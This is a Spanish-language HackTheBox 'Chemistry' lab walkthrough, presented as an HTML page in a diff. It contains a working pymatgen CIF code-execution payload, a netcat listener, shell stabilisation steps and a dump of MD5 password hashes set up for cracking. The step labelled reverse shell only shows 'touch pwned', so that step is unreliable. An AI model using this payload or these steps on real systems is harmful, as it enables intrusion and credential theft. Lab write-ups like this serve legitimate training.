@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chemistry | Mi Potafolio De Pentesting</title>
+    <style>
+        body {
+            background-color: #0f0f0f;
+            color: #c9d1d9;  
+            font-family: 'Courier New', Courier, monospace;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width: 850px;
+            width: 100%;
+        }
+        header {
+            border-bottom: 2px solid #00ff41;
+            margin-bottom: 30px;
+            padding-bottom: 10px;
+        }
+        .back-link {
+            color: #00ff41;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+        h1 { color: #fff; margin: 10px 0; }
+        .meta { color: #888; font-size: 0.8em; margin-bottom: 20px; }
+        
+         
+        .content { background: #161b22; padding: 25px; border-radius: 5px; border: 1px solid #30363d; }
+        .content h2, .content h3 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 5px; }
+        
+         
+        pre {
+            background: #000;
+            padding: 15px;
+            border-left: 3px solid #00ff41;
+            overflow-x: auto;
+            color: #f8f8f2;
+        }
+        code { font-family: 'Consolas', monospace; color: #ff79c6; }
+        
+         
+        img { max-width: 100%; height: auto; border: 1px solid #00ff41; margin: 20px 0; }
+        
+        .tag { color: #0f0f0f; background: #00ff41; padding: 2px 8px; font-size: 0.7em; border-radius: 3px; margin-right: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="/" class="back-link">&lt; Volver al índice</a>
+            <h1>Chemistry</h1>
+            <div class="meta">
+                <span>Fecha: 10/01/2026</span> | 
+                <span>Autor: Admin</span>
+            </div>
+            <div>
+                
+                <span class="tag">#Linux</span>
+                
+                <span class="tag">#SMB</span>
+                
+                <span class="tag">#Exploit-db</span>
+                
+            </div>
+        </header>
+
+        <article class="content">
+            <p>Esto es una maquina de [[HackTheBox]] y aquí realizaremos por pasos como realizarla:</p>
+<p>Lo primero que deberemos de hacer es hacerle [[Ping]] a la maquina para saber si esta esta conectada o no.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">1</span> <span style="color:#f92672">[</span>IP_OBJETIVO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Después de saber que la maquina esta operativa y estamos conexión a ella lo que haremos es establecer nuestro entorno de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mkdir Chemistry 
+</span></span><span style="display:flex;"><span>cd Chemistry 
+</span></span><span style="display:flex;"><span>mkt
+</span></span><span style="display:flex;"><span>ll
+</span></span><span style="display:flex;"><span>drwxr-xr-x root root <span style="color:#ae81ff">0</span> B Mon Mar <span style="color:#ae81ff">10</span> 08:22:54 <span style="color:#ae81ff">2025</span>  content
+</span></span><span style="display:flex;"><span>drwxr-xr-x root root <span style="color:#ae81ff">0</span> B Mon Mar <span style="color:#ae81ff">10</span> 08:22:54 <span style="color:#ae81ff">2025</span>  exploits
+</span></span><span style="display:flex;"><span>drwxr-xr-x root root <span style="color:#ae81ff">0</span> B Mon Mar <span style="color:#ae81ff">10</span> 08:22:54 <span style="color:#ae81ff">2025</span>  nmap
+</span></span><span style="display:flex;"><span>drwxr-xr-x root root <span style="color:#ae81ff">0</span> B Mon Mar <span style="color:#ae81ff">10</span> 08:22:54 <span style="color:#ae81ff">2025</span>  scripts
+</span></span></code></pre></div><p>Ahora una ves creado nuestro entorno de trabajo lo que haremos es la realizar nuevamente un [[Ping]] para saber a que tipo de sistema operativo nos enfrentamos en cuestión.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">1</span> <span style="color:#f92672">[</span>IP_OBJETIVO<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>PING 10.10.11.38 <span style="color:#f92672">(</span>10.10.11.38<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.11.38: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">334</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.11.38 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> packets transmitted, <span style="color:#ae81ff">1</span> received, 0% packet loss, time 0ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 333.609/333.609/333.609/0.000 ms
+</span></span></code></pre></div><p>Por el valor del [[TTL]] sabemos que la maquina que nos estamos enfrentado es una maquina [[Linux]] = 64.</p>
+<p>Con un comando que tenemos puesto una ruta absoluta <!-- raw HTML omitted -->/usr/local/bin/<!-- raw HTML omitted -->[[whichSystem.py]] de nuestro equipo podemos saber mejor que [[Sistema Operativo]] es al cual no estamos enfrentando.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>whichSystem.py
+</span></span><span style="display:flex;"><span>	10.10.11.38 <span style="color:#f92672">(</span>ttl -&gt; 63<span style="color:#f92672">)</span>: Linux
+</span></span></code></pre></div><p>Ahora una vez hecho el escaneo principal de la maquina Objetivo, lo que procedemos a usar [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] para saber los [[Puerto]] que pueden ser vulnerables.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn <span style="color:#f92672">[</span>IP_OBJETIVO<span style="color:#f92672">]</span> -oG Allports
+</span></span></code></pre></div><p>Una vez realizado esto usaremos [[ExtractPorts]]:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>extractPorts Allports
+</span></span><span style="display:flex;"><span>───────┬───────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>       │ File: extractPorts.tmp
+</span></span><span style="display:flex;"><span>───────┼───────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>		  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.10.11.38
+</span></span><span style="display:flex;"><span>			<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 22,5000  
+</span></span><span style="display:flex;"><span>		  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>Una vez extraídos los [[Puerto]] que tenemos habilitados en esta maquina lo que procedemos a hacer es un nuevo escaneo [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap]]:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap -p22,5000 -sCV 10.10.11.38 -oN targeted
+</span></span></code></pre></div><p>Con esto podemos ver las versiones de los servicios que corren por los [[Puerto]] Habilitados
+y con ello podemos ver que versión de [[Linux]] nos enfrentamos.</p>
+<p>Sabiendo que el [[Puerto]] 5000 esta habilitado podemos hacer un [[Curl]] para saber si esat nos da respuesta y saber si hay una pagina web alojada.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -s 10.10.11.38:5000
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;head&gt;
+</span></span><span style="display:flex;"><span>    &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;title&gt;Chemistry - Home&lt;/title&gt;
+</span></span><span style="display:flex;"><span>    &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/styles.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;
+</span></span><span style="display:flex;"><span>&lt;body&gt;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;h1 class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title&#34;</span>&gt;Chemistry CIF Analyzer&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>        &lt;p&gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF <span style="color:#f92672">(</span>Crystallographic Information File<span style="color:#f92672">)</span> and analyze the structural data contained within.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>        &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;buttons&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;center&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/login&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;Login&lt;/a&gt;
+</span></span><span style="display:flex;"><span>            &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/register&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;Register&lt;/a&gt;&lt;/center&gt;
+</span></span><span style="display:flex;"><span>        &lt;/div&gt;
+</span></span><span style="display:flex;"><span>    &lt;/div&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;#  
+</span></span></code></pre></div><p>Y como podemos ver nos da una respuesta de que si existe una pagina web alojada en el [[Puerto]] 5000 con ello podemos emplear [[HTML2Text]] en el [[Curl]]:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -s 10.10.11.38 | html2text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>****** Chemistry CIF Analyzer ******
+</span></span><span style="display:flex;"><span>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Crystallographic Information File<span style="color:#f92672">)</span> and analyze the structural data contained
+</span></span><span style="display:flex;"><span>within.
+</span></span><span style="display:flex;"><span>                                Login Register
+</span></span></code></pre></div><p>Esto lo que hace es darnos los datos mas relevantes de la pagina web.</p>
+<p>Ahora podemos emplear un [[WhatWeb]] para ver lo que puede estar corriendo detrás de la pagina web.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>whatweb http://10.10.11.38:5000
+</span></span></code></pre></div><p><code>{css title:whatweb} http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]</code></p>
+<p>Una vez realizado esto lo que procedemos a hacer es visitar la pagina web en el [[Firefox]].</p>
+<p>![[Pasted image 20250310105052.png]]</p>
+<p>Nos podemos registrar y nos sale la opción de poder enviar un <strong>Archivo.cif</strong>.</p>
+<p>![[Pasted image 20250310120806.png]]</p>
+<p>Lo que podemos hacer ahora es buscar en el propio [[Firefox]] si hay algún tipo de vulnerabilidad en los archivos <strong>.cif</strong>. Y como podemos observar hay un repositorio [[GitHub]] que nos proporciona un exploit para los archivos *<em>.cif</em>.</p>
+<p><code>https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</code></p>
+<p>Con este repositorio copiamos el código que nos proporciono y lo añadimos a un archivo creado por nosotros mismo llamado <strong>test.cif</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nvim test.cif
+</span></span></code></pre></div><p>Le añadimos al archivo lo siguiente para que este nos proporcione un [[Ping]]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>data_5yOhtAoR
+</span></span><span style="display:flex;"><span>_audit_creation_date            2018-06-08
+</span></span><span style="display:flex;"><span>_audit_creation_method          <span style="color:#e6db74">&#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loop_
+</span></span><span style="display:flex;"><span>_parent_propagation_vector.id
+</span></span><span style="display:flex;"><span>_parent_propagation_vector.kxkykz
+</span></span><span style="display:flex;"><span>k1 <span style="color:#f92672">[</span><span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> 0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_space_group_magn.transform_BNS_Pp_abc  <span style="color:#e6db74">&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;ping -c 1 10.10.14.52&#34;);0,0,0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_space_group_magn.number_BNS  62.448
+</span></span><span style="display:flex;"><span>_space_group_magn.name_BNS  <span style="color:#e6db74">&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</span></span></code></pre></div><p>y abrimos otra [[Terminal]] para escuchar por el puerto tun0 que es el que esta conectado a mi [[VPN]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>tcpdump -i tun0 icmp -n
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>12:32:21.787113 IP 10.10.11.38 &gt; 10.10.14.52: ICMP echo request, id 3, seq 1, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>12:32:21.787125 IP 10.10.14.52 &gt; 10.10.11.38: ICMP echo reply, id 3, seq 1, length <span style="color:#ae81ff">64</span>
+</span></span></code></pre></div><p>Vemos que nos hizo [[Ping]], y ahora lo que podemos hacer es hacernos una [[Reverse Shell]] en el archivo <strong>.cif</strong> para conectarnos a la [[Terminal]] de la maquina Objetivo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nvim test.cif
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data_5yOhtAoR
+</span></span><span style="display:flex;"><span>_audit_creation_date            2018-06-08
+</span></span><span style="display:flex;"><span>_audit_creation_method          <span style="color:#e6db74">&#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>loop_
+</span></span><span style="display:flex;"><span>_parent_propagation_vector.id
+</span></span><span style="display:flex;"><span>_parent_propagation_vector.kxkykz
+</span></span><span style="display:flex;"><span>k1 <span style="color:#f92672">[</span><span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> 0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_space_group_magn.transform_BNS_Pp_abc  <span style="color:#e6db74">&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;touch pwned&#34;);0,0,0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_space_group_magn.number_BNS  62.448
+</span></span><span style="display:flex;"><span>_space_group_magn.name_BNS  <span style="color:#e6db74">&#34;P  n&#39;  m  a&#39;  &#34;</span>
+</span></span></code></pre></div><p>Y antes de depositar el Archivo <strong>.cif</strong> en la pagina web para que lo detecte lo que haremos es abrir de forma paralela una nueva [[Terminal]] con la que haremos un [[Netcat]] por el [[Puerto]] 443</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span></code></pre></div><p>Procedemos a enviar y después darle a view para que este se ejecute.</p>
+<p>![[Pasted image 20250310125726.png]]</p>
+<p>Una vez enviado el archivo <strong>.cif</strong> lo que procedemos hacer es observar si el [[Netcat]] tuvo efecto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.52<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.38<span style="color:#f92672">]</span> <span style="color:#ae81ff">33670</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>2430<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>app@chemistry:~$ 
+</span></span><span style="display:flex;"><span>app@chemistry:~$ 
+</span></span></code></pre></div><p>Una vez conectado a la maquina lo que procedemos a hacer es inspeccionar lo que nos podría ser útil para [[Escalar Privilegios]] y también haremos que la [[Reverse Shell]] se nos quede de manera que parezca lo mas parecido a nuestra [[Terminal]] y hacerla una [[Consola interactiva]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app@chemistry:~$ script /dev/null -c bash
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>Script started, file is /dev/null
+</span></span><span style="display:flex;"><span>app@chemistry:~$ 
+</span></span></code></pre></div><p>Despues en nuestra [[Terminal]] realizamos lo siguiente :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>			reset xterm
+</span></span></code></pre></div><p>Para que la [[Consola interactiva]] que no hemos hecho tenga las misma funciones que nuestra [[Terminal]] lo que tenemos que hacer es lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>stty rows <span style="color:#ae81ff">43</span> columns <span style="color:#ae81ff">184</span>
+</span></span></code></pre></div><p>Así tenemos la [[Consola interactiva]] como si fuese nuestra [[Terminal]].</p>
+<p>Ahora una vez dentro lo que procedemos ha realizar es una inspección a los archivos que tiene esta maquina y podemos ver que con el comando <strong>ls</strong> podemos ver que hay un archivo [[Python]] y con eso nos podemos meter para ver lo que puede haber dentro para saber que podemos realizar en un futuro.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app@chemistry:~$ ls
+</span></span><span style="display:flex;"><span>app.py  instance  static  templates  uploads
+</span></span><span style="display:flex;"><span>nano app.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  GNU nano 4.8                                                                             app.py                                                      <span style="color:#75715e">##Esto solo es una parte que nos interesa.</span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask<span style="color:#f92672">(</span>__name__<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>app.config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SECRET_KEY&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;MyS3cretCh3mistry4PP&#39;</span>
+</span></span><span style="display:flex;"><span>app.config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sqlite:///database.db&#39;</span>
+</span></span><span style="display:flex;"><span>app.config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;UPLOAD_FOLDER&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uploads/&#39;</span>
+</span></span><span style="display:flex;"><span>app.config<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ALLOWED_EXTENSIONS&#39;</span><span style="color:#f92672">]</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;cif&#39;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> SQLAlchemy<span style="color:#f92672">(</span>app<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>login_manager <span style="color:#f92672">=</span> LoginManager<span style="color:#f92672">(</span>app<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>login_manager.login_view <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;login&#39;</span>
+</span></span></code></pre></div><p>Como podemos apreciar en el archivo <strong>app.py</strong> que están usando [[SQLite]] para alojar datos, eso es algo muy interesante, ya que esto nos permitirá tener accesos las [[Databases]] de la maquina Objetivo.</p>
+<p>Por lo tanto lo que realizaremos ahora es un comando para saber donde esta alojado dicho programa.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app@chemistry:~$ find . -name database.db
+</span></span><span style="display:flex;"><span>./instance/database.db
+</span></span><span style="display:flex;"><span>app@chemistry:~$ ^C
+</span></span><span style="display:flex;"><span>app@chemistry:~$ file ./instance/database.db
+</span></span><span style="display:flex;"><span>./instance/database.db: SQLite 3.x database, last written using SQLite version <span style="color:#ae81ff">3031001</span>
+</span></span></code></pre></div><p>Una vez sabemos que SQLite3 esta en esa estancia lo que podemos hacer es lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>app@chemistry:~$ sqlite3 ./instance/database.db
+</span></span><span style="display:flex;"><span>SQLite version 3.31.1 2020-01-27 19:55:54
+</span></span><span style="display:flex;"><span>Enter <span style="color:#e6db74">&#34;.help&#34;</span> <span style="color:#66d9ef">for</span> usage hints.
+</span></span><span style="display:flex;"><span>sqlite&gt; .tables
+</span></span><span style="display:flex;"><span>structure  user 
+</span></span><span style="display:flex;"><span>sqlite&gt; <span style="color:#66d9ef">select</span> * from user;
+</span></span><span style="display:flex;"><span>1|admin|2861debaf8d99436a10ed6f75a252abf
+</span></span><span style="display:flex;"><span>2|app|197865e46b878d9e74a0346b6d59886a
+</span></span><span style="display:flex;"><span>3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+</span></span><span style="display:flex;"><span>4|robert|02fcf7cfc10adc37959fb21f06c6b467
+</span></span><span style="display:flex;"><span>5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+</span></span><span style="display:flex;"><span>6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+</span></span><span style="display:flex;"><span>7|peter|6845c17d298d95aa942127bdad2ceb9b
+</span></span><span style="display:flex;"><span>8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+</span></span><span style="display:flex;"><span>9|tania|a4aa55e816205dc0389591c9f82f43bb
+</span></span><span style="display:flex;"><span>10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+</span></span><span style="display:flex;"><span>11|gelacia|4af70c80b68267012ecdac9a7e916d18
+</span></span><span style="display:flex;"><span>12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+</span></span><span style="display:flex;"><span>13|axel|9347f9724ca083b17e39555c36fd9007
+</span></span><span style="display:flex;"><span>14|kristel|6896ba7b11a62cacffbdaded457c6d92
+</span></span><span style="display:flex;"><span>15|hjg|abe13ce258f6eda2607f89d65701af7f
+</span></span><span style="display:flex;"><span>16|root|5f4dcc3b5aa765d61d8327deb882cf99
+</span></span><span style="display:flex;"><span>17|user|ee11cbb19052e40b07aac0ca060c23ee
+</span></span><span style="display:flex;"><span>18|hello|5d41402abc4b2a76b9719d911017c592
+</span></span><span style="display:flex;"><span>19|test|16d7a4fca7442dda3ad93c9a726597e4
+</span></span><span style="display:flex;"><span>sqlite&gt; 
+</span></span></code></pre></div><p><strong>Con esto tenemos Usuarios potenciales para estar subiendo de privilegios .</strong></p>
+<p>Ahora con los [[Hash]]es que tenemos lo que podemos hacer es usar la herramienta de [[CrackStation]] para resolver las posibles contraseñas que nos proporciono [[SQLite]].</p>
+<p>Lo que hacemos es lo siguiente en nuestra [[Terminal]] para asi conseguir solo las credenciales de las contraseñas para así poderlas poner en [[CrackStation]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1|admin|2861debaf8d99436a10ed6f75a252abf
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2|app|197865e46b878d9e74a0346b6d59886a
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">4|robert|02fcf7cfc10adc37959fb21f06c6b467
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">7|peter|6845c17d298d95aa942127bdad2ceb9b
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">9|tania|a4aa55e816205dc0389591c9f82f43bb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">11|gelacia|4af70c80b68267012ecdac9a7e916d18
